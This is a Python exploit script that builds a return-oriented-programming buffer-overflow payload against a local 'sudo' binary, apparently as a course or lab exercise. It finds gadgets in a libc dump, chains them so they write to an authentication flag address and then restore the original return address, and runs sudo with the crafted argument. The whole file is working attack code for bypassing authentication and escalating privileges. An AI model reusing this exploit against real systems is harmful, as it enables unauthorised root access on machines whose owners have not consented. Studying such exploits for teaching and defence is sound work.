import os, sys

import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
LIBC_TEXT_SECTION_START_ADDR= 0xb7c39750

def get_arg():

    searchObg = GadgetSearch(LIBC_DUMP_PATH,LIBC_TEXT_SECTION_START_ADDR)


    #auth address: 0x804a054
    #movEAX = "b7c4ec81".decode("hex")
    movEAX = searchObg.find_format('mov eax,{0}')[1][2:].decode("hex")
    #the system expects binary in little-endian convention, so we need to flip the address
    #popEDX = "b7c4dc6d".decode("hex")
    popEDX = searchObg.find_format('pop edx')[1][2:].decode("hex")

    authAdr = "0804a054".decode("hex")

    MovEdxEax = searchObg.find_format('mov [edx],eax')[1][2:].decode("hex")

    originRetAdr = "080488c6".decode("hex")


    movEAX = movEAX[::-1]
    popEDX= popEDX[::-1]
    authAdr= authAdr[::-1]
    MovEdxEax= MovEdxEax[::-1]
    originRetAdr= originRetAdr[::-1]




    return 'A'*56 +'BBBB'+ 'CC'+'DDDD'+movEAX+popEDX+authAdr+MovEdxEax+originRetAdr


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
